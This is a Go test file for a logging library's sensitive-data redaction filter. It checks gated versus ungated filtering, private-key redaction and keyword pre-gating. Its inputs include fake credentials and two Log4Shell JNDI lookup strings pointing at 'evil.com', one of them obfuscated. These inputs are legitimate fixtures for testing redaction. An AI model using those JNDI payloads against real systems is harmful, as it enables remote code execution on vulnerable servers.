package dd

import (
	"strings"
	"testing"

	"github.com/cybergodev/dd/internal"
)

// TestFilterGateEndToEndEquality verifies that pattern gating (the
// necessary-condition fast path in Filter) never changes Filter's output:
// a gated filter built from the built-in pattern list must produce byte-for-byte
// identical results to an ungated filter built from the same list.
// This complements internal.TestPatternGateEquivalence (per-pattern soundness)
// with whole-pipeline evidence.
func TestFilterGateEndToEndEquality(t *testing.T) {
	internal.InitPatterns()

	inputs := []string{
		// Benign traffic that exercises the gate-skip path heavily
		"User john performed action 42",
		"request 200 OK in 34ms",
		"2026-08-30T15:04:05Z startup complete",
		"customer id 4711 ordered 2 items, total 99",
		"version 1.2.3 build 456",
		"no digits here at all",
		// Sensitive data that must still be redacted identically
		"password: hunter2",
		"card 4532015112830366 was charged",
		"4532-0151-1283-0366",
		"ssn 123-45-6789",
		"AKIAIOSFODNN7EXAMPLE",
		"token: abcdefghijklmnopqrstuvwxyz",
		"sk-ant-api03-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
		"ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ012345",
		// Fake Slack bot token; prefix split so GitHub push protection
		// doesn't flag the literal in source.
		"xox" + "b-123456789012-123456789012-abcdefghijklmnopqrstuvwx",
		"email foo.bar@example.com",
		"ip 192.168.1.100 blocked",
		"2001:db8::8a2e:370:7334",
		"mysql://user:pass@localhost:3306/db",
		"jdbc:postgresql://host:5432/db",
		"${jndi:ldap://evil.com/a}",
		"${${lower:j}ndi:ldap://evil.com}",
		"phone: 415-555-2671",
		"+14155552671",
		"diagnosis: A12.3",
		"npi: 1234567890",
		"mrn: ABC123456",
		"passport_number 123456789",
		"sin 123-456-789",
		"cvv: 123",
		"swift: DEUTDEFF500",
		"iban DE89370400440532013000",
		"glpat-abcdefghijklmnopqrst",
		"ya29.a0AfH6SMBabcdefghijklmno",
		"FwoGZXIvYXdzEAxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
		`{"private_key": "-----BEGIN RSA PRIVATE KEY-----MIIE-----END-----"}`,
		"-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA\n-----END RSA PRIVATE KEY-----",
		"fingerprint_template: abcdefghijklmno",
		"face_id: abcdefghijkl",
		"bio_hash=abcdefghijklmnopqr",
		"amqp://guest:guest@localhost:5672/",
		"kafka broker-1:9092",
		"connection_string=abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrst",
		"12.345.678-5",
		"123.456.789-09",
		"&ABC123456XXX",
		"QQ123456C",
		"eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U",
	}

	gated := newSensitiveDataFilterWithPatterns(internal.CompiledFullPatterns, internal.FullPatternGates, defaultFilterTimeout)
	ungated := newSensitiveDataFilterWithPatterns(internal.CompiledFullPatterns, nil, defaultFilterTimeout)

	for _, input := range inputs {
		want := ungated.Filter(input)
		got := gated.Filter(input)
		if got != want {
			t.Errorf("Filter(%q):\n  ungated: %q\n  gated:   %q", input, want, got)
		}
	}

	// The basic filter (DefaultSecurityConfig) uses the same gating machinery.
	basicGated := newSensitiveDataFilterWithPatterns(internal.CompiledBasicPatterns, internal.BasicPatternGates, defaultFilterTimeout)
	basicUngated := newSensitiveDataFilterWithPatterns(internal.CompiledBasicPatterns, nil, defaultFilterTimeout)
	for _, input := range inputs {
		want := basicUngated.Filter(input)
		got := basicGated.Filter(input)
		if got != want {
			t.Errorf("basic Filter(%q):\n  ungated: %q\n  gated:   %q", input, want, got)
		}
	}
}

// TestPEMPrivateKeyRedaction pins that the PEM and GCP private-key patterns
// actually compile and redact. Both historically contained {..,4000} repeat
// counts exceeding Go regexp's 1000 maximum: they failed to compile at
// InitPatterns and were silently dropped from every filter, so PEM private
// keys passed through unredacted. Gate-vs-ungate equality cannot catch this
// (both sides share the dead pattern); this test asserts the redaction itself.
// The key bodies contain digits so the message also passes the
// couldContainSensitiveData pre-gate (which requires digits/'@'/scheme/
// credential keyword) — the same path production messages take.
func TestPEMPrivateKeyRedaction(t *testing.T) {
	internal.InitPatterns()

	f := newSensitiveDataFilterWithPatterns(internal.CompiledFullPatterns, internal.FullPatternGates, defaultFilterTimeout)

	pemKey := "-----BEGIN RSA PRIVATE KEY-----\nMIIB0wIBAAKCAQEA1y2v8x9zQ4f7g\n-----END RSA PRIVATE KEY-----"
	if got := f.Filter(pemKey); got == pemKey {
		t.Errorf("PEM private key was not redacted: Filter returned the input unchanged")
	}

	gcpJSON := `{"private_key": "` + strings.Repeat("a1B2", 40) + `"}`
	if got := f.Filter(gcpJSON); got == gcpJSON {
		t.Errorf("GCP private_key value was not redacted: Filter returned the input unchanged")
	}
}

// TestKeywordGatedPatternsReachableThroughPreGate pins that every built-in
// pattern whose value can be letter-only (no digits, '@', "://", '+', API-key
// prefix, or base64 run) is still reachable through the hard pre-gate in
// couldContainSensitiveData — i.e. its context keyword appears in
// credentialKeywords. Before "swift"/"mrn"/"license"/"connection"/biometric
// keywords were added, inputs like "swift: DEUTDEFF" or
// "connection_string=..." carried no pre-gate signal at all and were returned
// UNREDACTED by the default (basic) filter.
func TestKeywordGatedPatternsReachableThroughPreGate(t *testing.T) {
	internal.InitPatterns()

	filters := map[string]*SensitiveDataFilter{
		"full":  NewSensitiveDataFilter(),
		"basic": newBasicSensitiveDataFilter(),
	}

	mustRedact := []string{
		"swift: DEUTDEFF",         // kwSwift, letter-only value
		"iban: DEUTDEFF",          // kwSwift context pattern
		"mrn: ABCDEFGH",           // kwMrn
		"patient_id: ABCDEFGH",    // kwMrn
		"driver_license: ABCDEFG", // kwLicense
		"dl_number: ABCDEFG",      // kwLicense
		"connection_string: " + strings.Repeat("aB", 30), // kwConn (50+ char secret)
		"azure_connection: " + strings.Repeat("aB", 30),  // kwConn
		"fingerprint_template: abcdefghijkl",             // kwBio
		"bio_hash: " + strings.Repeat("ab", 13),          // kwBio (value ≥20 chars per pattern)
	}
	mustNotRedact := []string{
		// Ordinary digit-free prose containing the same keywords: the patterns'
		// own shapes (required suffixes, uppercase-only SWIFT codes) must not
		// fire, so widening the pre-gate keyword list stays false-positive-free.
		"swift delivery of the parcel took eleven days",
		"the bank transfer settled before noon",
		"patient was discharged after observation",
		"driver training course completed on friday",
		"connection to the primary cluster was refused",
		"interface changed without downtime",
		"medical history was reviewed",
	}

	for name, f := range filters {
		for _, in := range mustRedact {
			if got := f.Filter(in); got == in {
				t.Errorf("%s filter did not redact letter-only sensitive value: %q", name, in)
			}
		}
		for _, in := range mustNotRedact {
			if got := f.Filter(in); got != in {
				t.Errorf("%s filter false positive on benign prose: %q -> %q", name, in, got)
			}
		}
	}
}

// TestExtrasPresetsKeepGatesAligned pins the invariant newSensitiveDataFilterWithExtras
// must uphold: the gates slice stays index-aligned with the combined pattern slice.
// Filter applies gating only when len(gates) == len(patterns); a shorter gates
// slice (len(base) instead of len(base)+len(extras)) silently disabled gating for
// EVERY pattern in the strict/paranoid/healthcare/financial/government presets —
// a performance regression the type system could not catch.
func TestExtrasPresetsKeepGatesAligned(t *testing.T) {
	internal.InitPatterns()

	presets := map[string]*SensitiveDataFilter{
		"strict":     newSensitiveDataFilterWithExtras(strictExtraCompiled),
		"paranoid":   newSensitiveDataFilterWithExtras(paranoidExtraCompiled),
		"healthcare": newSensitiveDataFilterWithExtras(healthcareExtraCompiled),
		"financial":  newSensitiveDataFilterWithExtras(financialExtraCompiled),
		"gov":        newSensitiveDataFilterWithExtras(governmentExtraCompiled),
	}
	for name, f := range presets {
		patterns := f.patternsPtr.Load()
		gates := f.gatesPtr.Load()
		if patterns == nil || gates == nil {
			t.Fatalf("%s preset: nil pattern/gate slice", name)
		}
		if len(*patterns) != len(*gates) {
			t.Errorf("%s preset: gates slice (%d) not aligned with patterns (%d) — gating disabled", name, len(*gates), len(*patterns))
		}
	}
}
